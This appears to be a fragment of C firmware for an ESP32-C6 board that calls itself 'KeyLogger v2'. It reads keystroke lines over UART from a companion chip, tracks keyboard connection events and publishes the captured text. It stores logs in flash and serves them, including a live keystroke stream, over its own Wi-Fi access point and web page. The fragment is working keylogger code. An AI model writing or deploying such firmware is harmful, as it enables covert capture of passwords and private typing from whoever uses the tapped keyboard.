        .parity = UART_PARITY_DISABLE, .stop_bits = UART_STOP_BITS_1,
        .flow_ctrl = UART_HW_FLOWCTRL_DISABLE, .source_clk = UART_SCLK_DEFAULT,
    };
    uart_driver_install(P4_UART_NUM, 4096, 0, 0, NULL, 0);
    uart_param_config(P4_UART_NUM, &cfg);
    uart_set_pin(P4_UART_NUM, UART_PIN_NO_CHANGE, P4_UART_RX,
                 UART_PIN_NO_CHANGE, UART_PIN_NO_CHANGE);

    char line[512]; int li = 0;
    uint8_t buf[256];
    while (1) {
        int n = uart_read_bytes(P4_UART_NUM, buf, sizeof(buf), pdMS_TO_TICKS(50));
        if (n > 0) s_uart_bytes_total += n;
        for (int i = 0; i < n; i++) {
            uint8_t c = buf[i];
            if (c == '\n') {
                if (li == 0) continue;
                line[li++] = '\n'; line[li] = 0;
                // Recognize EVT keyboard/mouse presence to keep local UI state.
                if (!strncmp(line, "EVT KBD_CONNECT",    15)) s_kbd_present   = true;
                else if (!strncmp(line, "EVT KBD_DISCONNECT",    18)) s_kbd_present   = false;
                else if (!strncmp(line, "EVT MOUSE_CONNECT",    17)) s_mouse_present = true;
                else if (!strncmp(line, "EVT MOUSE_DISCONNECT",  20)) s_mouse_present = false;
                publish(line);
                li = 0;
            } else if (c == '\r') {
                // ignore
            } else if (li < (int)sizeof(line) - 2) {
                line[li++] = (char)c;
            } else {
                // overflow — emit what we have as a raw chunk and reset
                line[li] = 0; publish(line); li = 0;
            }
        }
    }
}

// ------------------------- app entry ---------------------------------
void app_main(void) {
    ESP_LOGI(TAG, "ESP32-C6 KeyLogger v2 starting");
    s_ws_lock  = xSemaphoreCreateMutex();
    s_log_lock = xSemaphoreCreateMutex();
    s_led_lock = xSemaphoreCreateMutex();
    s_live_ring = xRingbufferCreate(LIVE_RING_BYTES, RINGBUF_TYPE_BYTEBUF);
    // Live streaming defaults to OFF at boot so browsers connecting to the
    // AP after keystrokes happened don't get flooded with a backlog. The
    // user turns it on with the Start Live Logging button when they want it.
    s_live_streaming = false;

    esp_err_t nerr = nvs_flash_init();
    if (nerr == ESP_ERR_NVS_NO_FREE_PAGES || nerr == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        nvs_flash_erase(); nerr = nvs_flash_init();
    }
    if (nerr != ESP_OK) ESP_LOGE(TAG, "nvs_flash_init: %s", esp_err_to_name(nerr));

    nvs_load_settings();          // recording / auto-download / LED mode
    boot_trace(BOOT_PHASE_BOOT);

    // Bring SDIO slave up BEFORE any wifi work so the P4's CMD5/CMD3 probe
    // isn't racing wifi driver init on the C6's single core.
    if (sdio_slave_up() != ESP_OK) {
        ESP_LOGE(TAG, "SDIO slave failed (P4 link disabled)");
        boot_trace(BOOT_PHASE_WIFI_FAIL);
        led_phase(LED_MODE_RED);          // no link = stay red forever
    } else {
        boot_trace(BOOT_PHASE_SDIO_UP);
        led_phase(LED_MODE_GREEN);        // alive + SDIO enumerated
    }

    // LED wire owner first so boot telemetry is on reg 40 before the wifi
    // verdict lands; wifi gets its own roomy task (never runs on main).
    xTaskCreate(led_task,   "led_wire",  2048, NULL, 2, NULL);
    xTaskCreate(wifi_task,  "wifi_up",   8192, NULL, 6, NULL);

    if (storage_up() != ESP_OK) ESP_LOGE(TAG, "SPIFFS failed (log persistence disabled)");
    if (http_up()   != ESP_OK) ESP_LOGE(TAG, "HTTP server failed");
    xTaskCreate(uart_task, "uart_rx", 4096, NULL, 5, NULL);

    ESP_LOGI(TAG, "SSID \"%s\" PASS \"%s\" -> http://192.168.4.1  rec=%d adl=%d",
             AP_SSID, AP_PASS, s_recording, s_auto_dl);
    boot_trace(BOOT_PHASE_RUNNING);
    while (1) vTaskDelay(pdMS_TO_TICKS(5000));
}